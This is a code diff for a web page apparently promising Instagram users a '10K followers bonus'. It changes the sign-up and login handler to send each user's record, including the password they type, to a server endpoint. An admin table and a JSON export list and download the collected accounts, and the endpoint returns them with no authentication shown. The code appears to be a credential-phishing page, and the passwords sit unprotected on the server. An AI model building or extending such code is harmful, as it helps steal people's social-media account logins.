@@ -1,5 +1,6 @@
 const STORAGE_KEY = "ig_bonus_users";
 const CURRENT_USER_KEY = "ig_bonus_current_user";
+const API_URL = "/api/users";
 
 const modeButtons = document.querySelectorAll(".mode-btn");
 const authForm = document.getElementById("authForm");
@@ -8,7 +9,20 @@ const submitBtn = document.getElementById("submitBtn");
 const switchText = document.getElementById("switchText");
 const statusBox = document.getElementById("statusBox");
 
-function getUsers() {
+async function getUsers() {
+  try {
+    const response = await fetch(API_URL, { method: "GET" });
+    if (response.ok) {
+      const data = await response.json();
+      if (Array.isArray(data)) {
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+        return data;
+      }
+    }
+  } catch (error) {
+    // ignore and fall back to localStorage
+  }
+
   try {
     return JSON.parse(localStorage.getItem(STORAGE_KEY)) || [];
   } catch (error) {
@@ -51,20 +65,37 @@ function saveCurrentUser(user) {
   localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(user));
 }
 
-function addUser(user) {
-  const users = getUsers();
+async function addUser(user) {
   const record = {
     id: Date.now(),
     ...user,
     createdAt: new Date().toISOString(),
   };
 
+  try {
+    const response = await fetch(API_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(record),
+    });
+
+    if (response.ok) {
+      const remoteUsers = await response.json();
+      saveUsers(remoteUsers);
+      saveCurrentUser({ ...record, password: "***hidden***" });
+      return;
+    }
+  } catch (error) {
+    // ignore and fall back to local storage below
+  }
+
+  const users = await getUsers();
   users.unshift(record);
   saveUsers(users);
   saveCurrentUser({ ...record, password: "***hidden***" });
 }
 
-function validateAndSubmit(event) {
+async function validateAndSubmit(event) {
   event.preventDefault();
 
   const formData = new FormData(authForm);
@@ -103,12 +134,12 @@ function validateAndSubmit(event) {
     bonus: "10K followers bonus",
   };
 
-  addUser(payload);
+  await addUser(payload);
 
   if (statusBox) {
     statusBox.textContent = mode === "signup"
-      ? `Welcome ${username}! Your 10K bonus request has been saved locally.`
-      : `Welcome back ${username}! Your account session has been saved locally.`;
+      ? `Welcome ${username}! Your 10K bonus request has been saved and is visible to the admin.`
+      : `Welcome back ${username}! Your account session has been saved and is visible to the admin.`;
     statusBox.style.background = "#ecfdf5";
     statusBox.style.borderColor = "#a7f3d0";
     statusBox.style.color = "#065f46";
@@ -120,8 +151,8 @@ function validateAndSubmit(event) {
   }
 }
 
-function renderAdminTable() {
-  const users = getUsers();
+async function renderAdminTable() {
+  const users = await getUsers();
   const tableBody = document.getElementById("usersTableBody");
 
   if (!tableBody) return;
@@ -162,8 +193,8 @@ function renderAdminTable() {
   if (signupCount) signupCount.textContent = String(users.filter((user) => user.mode === "signup").length);
 }
 
-function exportJson() {
-  const users = getUsers();
+async function exportJson() {
+  const users = await getUsers();
   const data = JSON.stringify(users, null, 2);
   const blob = new Blob([data], { type: "application/json" });
   const url = URL.createObjectURL(blob);
@@ -174,12 +205,18 @@ function exportJson() {
   URL.revokeObjectURL(url);
 }
 
-function clearData() {
+async function clearData() {
+  try {
+    await fetch(API_URL, { method: "DELETE" });
+  } catch (error) {
+    // ignore and clear local fallback below
+  }
+
   localStorage.removeItem(STORAGE_KEY);
   localStorage.removeItem(CURRENT_USER_KEY);
   renderAdminTable();
   if (statusBox) {
-    statusBox.textContent = "Local data cleared successfully.";
+    statusBox.textContent = "Data cleared successfully.";
     statusBox.style.background = "#fef2f2";
     statusBox.style.borderColor = "#fecaca";
     statusBox.style.color = "#991b1b";
